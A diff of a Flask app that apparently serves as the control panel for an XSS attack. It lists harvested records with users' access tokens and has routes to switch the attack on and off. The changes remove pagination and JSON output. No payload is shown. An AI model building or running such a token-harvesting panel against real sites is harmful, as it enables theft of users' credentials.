@@ -36,14 +36,14 @@ def set_app_state(key, value):
     try:
         state = AppState.query.filter_by(key=key).first()
         now = datetime.now().isoformat()
-        
+
         if state:
             state.value = value
             state.updated_at = now
         else:
             state = AppState(key=key, value=value, updated_at=now)
             db.session.add(state)
-            
+
         db.session.commit()
         return True
     except Exception as e:
@@ -93,52 +93,19 @@ def collect():
 
 @main_bp.route('/')
 def display_data():
-    """Render collected data with pagination."""
-    page = request.args.get('page', 1, type=int)
-    per_page = current_app.config.get('PER_PAGE', 50)
-    request_format = request.args.get('format', '')
-    is_ajax = request.headers.get('X-Requested-With') == 'XMLHttpRequest'
-
+    """Render collected data."""
     try:
-        pagination = CollectedData.query.order_by(
+        data = CollectedData.query.order_by(
             CollectedData.id.desc()
-        ).paginate(page=page, per_page=per_page, error_out=False)
+        ).all()
 
         # Get current attack state
         attack_state = get_app_state(ATTACK_STATE_KEY, "inactive")
 
-        # Return JSON for AJAX requests or when format=json is specified
-        if is_ajax or request_format == 'json':
-            items_data = []
-            for item in pagination.items:
-                items_data.append({
-                    'id': item.id,
-                    'timestamp': item.timestamp,
-                    'current_user': item.current_user,
-                    'access_token': item.access_token
-                })
-                
-            pagination_data = {
-                'page': pagination.page,
-                'pages': pagination.pages,
-                'has_prev': pagination.has_prev,
-                'has_next': pagination.has_next,
-                'prev_num': pagination.prev_num if pagination.has_prev else None,
-                'next_num': pagination.next_num if pagination.has_next else None,
-                'total': pagination.total
-            }
-            
-            return jsonify({
-                'items': items_data,
-                'pagination': pagination_data,
-                'attack_state': attack_state
-            })
-        
-        # Return HTML for regular requests
+        # Return HTML for requests
         return render_template(
             'index.html',
-            data=pagination.items,
-            pagination=pagination,
+            data=data,
             now={'year': datetime.now().year},
             attack_state=attack_state
         )
@@ -150,10 +117,6 @@ def display_data():
         current_app.logger.exception(f"Unexpected error retrieving data: {e}")
         error_msg = "Error retrieving data"
 
-    # Return appropriate error based on request type
-    if is_ajax or request_format == 'json':
-        return jsonify({'error': error_msg}), 500
-    
     return render_template('index.html', data=[], error=error_msg)
 
 
@@ -162,17 +125,13 @@ def enable_attack():
     """Enable XSS attack."""
     current_app.logger.info("Enabling XSS attack...")
     result = run_attack_operation("enable")
-    
+
     if result['success']:
         current_app.logger.info("Attack enabled successfully")
         set_app_state(ATTACK_STATE_KEY, "active")
     else:
         current_app.logger.warning(f"Failed to enable attack: {result['message']}")
-    
-    # For AJAX requests
-    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
-        return jsonify(result)
-    
+
     # For regular form submissions
     return redirect(url_for('main.display_data'))
 
@@ -182,23 +141,18 @@ def disable_attack():
     """Disable XSS attack."""
     current_app.logger.info("Disabling XSS attack...")
     result = run_attack_operation("disable")
-    
+
     if result['success']:
         current_app.logger.info("Attack disabled successfully")
         set_app_state(ATTACK_STATE_KEY, "inactive")
     else:
         current_app.logger.warning(f"Failed to disable attack: {result['message']}")
-    
-    # For AJAX requests
-    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
-        return jsonify(result)
-    
+
     # For regular form submissions
     return redirect(url_for('main.display_data'))
 
 
 @main_bp.route('/attack/state', methods=['GET'])
 def get_attack_state():
-    """Get current attack state."""
     attack_state = get_app_state(ATTACK_STATE_KEY, "inactive")
     return jsonify({"state": attack_state})
